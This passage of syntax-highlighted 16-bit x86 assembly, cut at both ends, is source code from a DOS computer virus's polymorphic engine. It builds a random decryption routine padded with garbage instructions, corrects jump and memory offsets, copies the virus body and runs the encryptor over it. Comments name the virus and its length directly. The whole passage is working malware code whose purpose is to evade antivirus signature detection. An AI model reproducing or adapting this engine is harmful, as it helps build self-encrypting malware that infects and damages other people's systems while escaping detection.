        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; select garbage reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">        </span><span class="sc1">; is still compatible?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">select_a_reg_rdag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_garbage_limits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">np_nolimits_rgrb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_with_compat</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">generate_rda_ginst</span><span class="sc0">

</span><span class="sc5">some_type_limit_set</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_with_compat</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">generate_rda_ginst</span><span class="sc0">

</span><span class="sc5">np_nolimits_rgrb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_instr_from_table</span><span class="sc0">    </span><span class="sc1">; set si to an entry in the</span><span class="sc0">
                        </span><span class="sc1">; table</span><span class="sc0">

</span><span class="sc5">generate_rda_ginst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_generator</span><span class="sc0">      </span><span class="sc1">; call appropriate handler</span><span class="sc0">
                        </span><span class="sc1">; for the entry pointed by si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rda_garbage_loop_1</span><span class="sc0">

</span><span class="sc5">move_for_next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; to next entry</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; loop counter</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">end_rda_basic_body_gen</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">main_rda_loop_body</span><span class="sc0">

</span><span class="sc1">; now the entire rda routine has been placed and now the modifications and</span><span class="sc0">
</span><span class="sc1">; assignations are needed (ie. correct all the jump offsets, since garbage</span><span class="sc0">
</span><span class="sc1">; was inserted and so on)</span><span class="sc0">

</span><span class="sc5">end_rda_basic_body_gen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_corr_mem_offsets</span><span class="sc0">    </span><span class="sc1">; correct any memory reference</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_add_to_lenght_rnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_add_di_instr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; the correction of di before</span><span class="sc0">
                        </span><span class="sc1">; the cmp cs:[di],dx in the</span><span class="sc0">
                        </span><span class="sc1">; rda code depending on how</span><span class="sc0">
                        </span><span class="sc1">; many nops we stored</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_cx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_reg_si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">; copy the virus to encrypt</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_total_lenght</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pnt_to_end_after_rda</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_second_dw_0</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; pointer to second 00 dw in rda</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_add_to_lenght_rnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; virus lenght</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; + 0-10h random</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; pointer to end (to the nops)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rtc_comm_routine</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_add_to_lenght_rnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_fourth_dw_0</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; pointer to fourth 00 dw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_third_dw_0</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; pointer to third 00 dw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_db_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_modulusv</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">
                    </span><span class="sc1">; pointer to first 00 dw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; one of the inits</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; place it in the loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the second</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; place in the loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_calculate_value_in_dx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">end_most_internal_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; calculated value on undec body</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_checkvalue</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rda_add_to_lenght_rnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; store the calculated value</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_dec_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; next time will have to decr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_encdec_routine</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">end_most_internal_layer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; execute encryptor</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; now just delete the enc data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rda_add</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; rda finished</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">rda_corr_mem_offsets</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_basic_body</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rda_steps_table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc0">        </span><span class="sc1">; number of steps</span><span class="sc0">

</span><span class="sc5">rda_corr_loop_begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get the info byte to check</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rda_corr_do_smthing</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rda_corr_skip_to_next</span><span class="sc0">

</span><span class="sc5">rda_corr_do_smthing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rda_corr_somejump</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rda_corr_mem_references</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rda_corr_getback_2</span><span class="sc0">

</span><span class="sc1">; correct the displacement of a memory reference (ie. [si+666h]) to include</span><span class="sc0">
</span><span class="sc1">; the generated garbage</span><span class="sc0">
</span><span class="sc5">rda_corr_mem_references</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; check for a segment override to skip</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">     </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_skip_seg_ov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">     </span><span class="sc1">; DS:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_skip_seg_ov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">     </span><span class="sc1">; ES:</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_corr_skip_seg_ov</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36h</span><span class="sc0">     </span><span class="sc1">; SS:</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rda_corr_mem_ref</span><span class="sc0">

</span><span class="sc5">rda_corr_skip_seg_ov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; skip the segment override</span><span class="sc0">

</span><span class="sc5">rda_corr_mem_ref</span><span class="sc4">:</span><span class="sc0">
